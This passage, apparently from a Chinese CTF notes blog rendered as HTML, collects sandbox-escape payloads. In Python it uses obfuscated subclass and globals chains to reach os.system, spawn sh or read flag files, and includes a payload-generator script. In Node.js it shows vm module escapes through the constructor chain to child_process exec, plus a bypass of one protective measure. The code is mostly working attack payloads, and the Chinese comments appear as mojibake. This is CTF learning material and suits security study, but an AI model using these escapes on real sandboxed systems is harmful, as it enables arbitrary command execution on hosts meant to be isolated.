</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=mi>102</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>103</span><span class=p>))</span><span class=o>.</span><span class=n>read</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#å…ˆè¾“å…¥eval(input())ç»•è¿‡å­—æ•°é™åˆ¶</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=mi>102</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>+</span><span class=nb>chr</span><span class=p>(</span><span class=mi>103</span><span class=p>))</span><span class=o>.</span><span class=n>read</span><span class=p>())</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#ä½¿ç”¨Unicodeå­—ç¬¦ç»•è¿‡è¿‡æ»¤</span>
</span></span><span class=line><span class=cl><span class=n>áµ‰val</span><span class=p>(</span><span class=n>inpáµ˜t</span><span class=p>())</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#ä½¿ç”¨breakpoint()å‡½æ•°ä¸‹æ–­ç‚¹è¿›å…¥Pdbï¼Œç„¶åå†è¾“å…¥å‘½ä»¤</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#è¾“å…¥help()</span>
</span></span><span class=line><span class=cl><span class=c1>#å†è¾“å…¥sys</span>
</span></span><span class=line><span class=cl><span class=c1>#ç„¶åè¾“å…¥!cat flagè·å–flag</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#åœ¨help()ä¸­å¯ä»¥è¾“å…¥__main__æˆ–è€…__dict__æŸ¥çœ‹æ˜¯å¦æœ‰ä¿¡æ¯æ³„éœ²</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#ä½¿ç”¨bytes([]).decode()æ¥ç»•è¿‡chrçš„decode</span>
</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>((</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>102</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>108</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>97</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>103</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span><span class=o>.</span><span class=n>read</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#è·å–objectçš„å­ç±»åˆ—è¡¨ä¸­å€’æ•°ç¬¬å››ä¸ªå­ç±»çš„__init__æ–¹æ³•çš„å…¨å±€å˜é‡ä¸­åä¸º&#39;system&#39;çš„å¯¹è±¡</span>
</span></span><span class=line><span class=cl><span class=p>[]</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[(</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>121</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>116</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>101</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>109</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>()]((</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>99</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>97</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>116</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>32</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>102</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>108</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>97</span><span class=p>])</span><span class=o>+</span><span class=nb>bytes</span><span class=p>([</span><span class=mi>103</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#å¦‚æœè¿‡æ»¤äº†bytesï¼Œå¯ä»¥ç”¨type(str(1).encode())ç»•è¿‡</span>
</span></span><span class=line><span class=cl><span class=p>[]</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[(</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>121</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>115</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>116</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>101</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>109</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>()]((</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>108</span><span class=p>])</span><span class=o>+</span><span class=nb>type</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())([</span><span class=mi>115</span><span class=p>]))</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#system(&#39;ls&#39;)</span></span></span></code></pre></td></tr></table></div></div><p>ä¸€äº›æ–¹æ³•çš„typeæ„é€ </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>str = type(str(0))
</span></span><span class=line><span class=cl>list = type(type(flag).mro())(flag)
</span></span><span class=line><span class=cl>bytes = type(flag.encode())
</span></span><span class=line><span class=cl>bool = type(flag.istitle())
</span></span><span class=line><span class=cl>int = type(flag.find(flag))
</span></span><span class=line><span class=cl>tuple = type(flag.partition(flag))</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#å¦‚æœ+è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨.__add__(xxx)æ¥ç»•è¿‡</span>
</span></span><span class=line><span class=cl><span class=c1>#è‡ªåŠ¨ç”ŸæˆPayloadçš„è„šæœ¬:</span>
</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=s2>&#34;cat flag_y0u_CaNt_FiNd_mE&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mylist</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=s2>&#34;[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>system</span><span class=p>,</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>command</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>mylist</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;type(str(1).encode())([</span><span class=si>{</span><span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=si>}</span><span class=s2>])&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;(&#34;</span><span class=o>+</span><span class=n>mylist</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># åˆ é™¤å¹¶æ‰“å°å‡ºåˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ </span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>mylist</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;.__add__(</span><span class=si>{</span><span class=n>item</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>,</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;)&#34;</span><span class=p>,</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#typeè¢«è¿‡æ»¤äº†å¯ä»¥ä½¿ç”¨list(dict(system=114514))[0]è·å–systemè¿™ä¸ªå­—ç¬¦ä¸²</span>
</span></span><span class=line><span class=cl><span class=p>[]</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=nb>list</span><span class=p>(</span><span class=nb>dict</span><span class=p>(</span><span class=n>system</span><span class=o>=</span><span class=mi>1</span><span class=p>))[</span><span class=mi>0</span><span class=p>]](</span><span class=nb>list</span><span class=p>(</span><span class=nb>dict</span><span class=p>(</span><span class=n>sh</span><span class=o>=</span><span class=mi>1</span><span class=p>))[</span><span class=mi>0</span><span class=p>])</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#å¯ä»¥ä½¿ç”¨dir()å‡½æ•°æŸ¥çœ‹ç±»ä¸­çš„æ–¹æ³•å’Œå˜é‡å</span>
</span></span><span class=line><span class=cl><span class=c1>#å¦‚æœæœ‰encodeæ–¹æ³•å°±å¯ä»¥è¯»å–flag</span>
</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=n>my_flag</span><span class=o>.</span><span class=n>flag_level5</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#å¯ä»¥è¾“å…¥globals()å‡½æ•°æŸ¥çœ‹å…¨å±€å˜é‡ä¸­æ˜¯å¦æœ‰ä¿¡æ¯æ³„éœ²</span>
</span></span><span class=line><span class=cl><span class=c1>#å¯ä»¥è¾“å…¥vars()å‡½æ•°æŸ¥çœ‹å…¨å±€å˜é‡ä¸­æ˜¯å¦æœ‰ä¿¡æ¯æ³„éœ²</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#åˆ©ç”¨__import__()å‡½æ•°åŠ¨æ€å¯¼å…¥æ¨¡å—</span>
</span></span><span class=line><span class=cl><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;sys&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>__stdout__</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;flag&#34;</span><span class=p>,</span><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>O_RDONLY</span><span class=p>),</span> <span class=mh>0x114</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#__import__(&#34;sys&#34;).__stdout__.write()ä»sysæ¨¡å—ä¸­è·å–stdoutå¹¶è°ƒç”¨writeæ–¹æ³•è®²å†…å®¹è¾“å‡ºåˆ°æ§åˆ¶å°</span>
</span></span><span class=line><span class=cl><span class=c1>#__import__(&#34;os&#34;).read()ä»osæ¨¡å—ä¸­è°ƒç”¨readæ–¹æ³•å»è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¯»å–æ–‡ä»¶çš„å‰0x114(276)ä¸ªå­—èŠ‚</span>
</span></span><span class=line><span class=cl><span class=c1>#__import__(&#34;os&#34;).open()ä»osæ¨¡å—ä¸­è°ƒç”¨openæ–¹æ³•æ‰“å¼€ä¸€ä¸ªåä¸ºflag çš„æ–‡ä»¶ï¼Œå¹¶è®¾ç½®ä¸ºåªè¯»æ¨¡å¼</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#åˆ©ç”¨lambdaåŒ¿åå‡½æ•°æ¥è¯»å–flag</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=k>lambda</span><span class=p>:</span><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;cat flag&#39;</span><span class=p>))()</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=vmæ²™ç®±é€ƒé€¸><span>VMæ²™ç®±é€ƒé€¸</span>
<a href=#vm%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=vmæ²™ç®±é€ƒé€¸-1><span>VMæ²™ç®±é€ƒé€¸</span>
<a href=#vm%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8-1 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>ç¤ºä¾‹ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// å¼•å…¥Nodejsæ ‡å‡†åº“ä¸­çš„vmæ¨¡å—
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>sandbox</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;name&#39;</span><span class=o>:</span> <span class=s1>&#39;someone&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;age&#39;</span><span class=o>:</span> <span class=mi>18</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// åˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œåœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œçš„ä»£ç åªèƒ½è®¿é—®sandboxä¸­çš„å±æ€§
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>context</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>createContext</span><span class=p>(</span><span class=nx>sandbox</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>// vm.runInThisContext(code)ï¼šåœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚å¯ä»¥è®¿é—®åˆ°globalä¸Šçš„å…¨å±€å˜é‡ï¼Œä½†æ˜¯è®¿é—®ä¸åˆ°è‡ªå®šä¹‰çš„å˜é‡
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInThisContext</span><span class=p>(</span><span class=s2>&#34;process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)&#34;</span><span class=p>,</span> <span class=nx>context</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>result</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡Œå‘½ä»¤éœ€è¦child_processæ¨¡å—ï¼Œä½†æ˜¯åœ¨æ²™ç®±ç¯å¢ƒä¸­ä¸èƒ½ç›´æ¥requireå¼•å…¥child_process</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡processå¯¹è±¡è·å–</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//è¿™é‡Œçš„thisæŒ‡å‘vmåˆ›å»ºçš„context,ç„¶åé€šè¿‡åŸå‹é“¾çš„æ–¹å¼æ‹¿åˆ°Function
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>y1</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInNewContext</span><span class=p>(</span><span class=sb>`this.toString.constructor(&#34;return process&#34;)();`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//åªè¦æ˜¯å¤–éƒ¨çš„å¼•ç”¨çš„ç‰¹æ€§ï¼Œéƒ½å¯ä»¥ç”¨æ¥è·å–å¹¶è¿›è¡Œé€ƒé€¸
</span></span></span><span class=line><span class=cl><span class=c1>//context = vm.createContext({a:[]})
</span></span></span><span class=line><span class=cl><span class=c1>//const result = vm.runInNewContext(`a.constructor.constructor(&#34;return process&#34;)()`,context);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>y1</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>exec</span><span class=p>(</span><span class=s1>&#39;calc&#39;</span><span class=p>));</span></span></span></code></pre></td></tr></table></div></div><p>å¯¹ä»¥ä¸Šä»£ç çš„é˜²æŠ¤æ‰‹æ®µ(å°†ä¸Šä¸‹æ–‡å¯¹è±¡çš„åŸå‹é“¾è®¾ç½®ä¸ºnull)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>vm</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>context</span> <span class=o>=</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>create</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=nx>vm</span><span class=p>.</span><span class=nx>runInNewContext</span><span class=p>(</span><span class=sb>`this.constructor.constructor(&#34;return process&#34;)()`</span><span class=p>,</span> <span class=nx>context</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//åŸå‹å¯¹è±¡è®¾ç½®ä¸ºnullï¼Œæ‰€ä»¥thiså°±æ— æ³•é€šè¿‡äºŒæ¬¡constructorè·å–Functionçš„åŸå‹å¯¹è±¡
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>result</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>exec</span><span class=p>(</span><span class=s1>&#39;calc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>result</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>é’ˆå¯¹ä¸Šè¿°é˜²æŠ¤çš„ç»•è¿‡æ–¹æ³•</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// å‰ç½®çŸ¥è¯†
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>argumentsæ˜¯ä¸€ä¸ªobjectå¯¹è±¡</span><span class=err>ï¼Œ</span><span class=nx>å‚¨å­˜äº†æ¯ä¸ªè°ƒç”¨å‡½æ•°ä¸­çš„ç›¸å…³å‚æ•°</span>
</span></span><span class=line><span class=cl><span class=nx>arguments</span><span class=p>.</span><span class=nx>calleeæ˜¯argumentsçš„ä¸€ä¸ªæˆå‘˜</span><span class=err>ï¼Œ</span><span class=nx>å®ƒçš„å€¼æ˜¯æ­£åœ¨è¢«æ‰§è¡Œçš„Functionå¯¹è±¡</span>
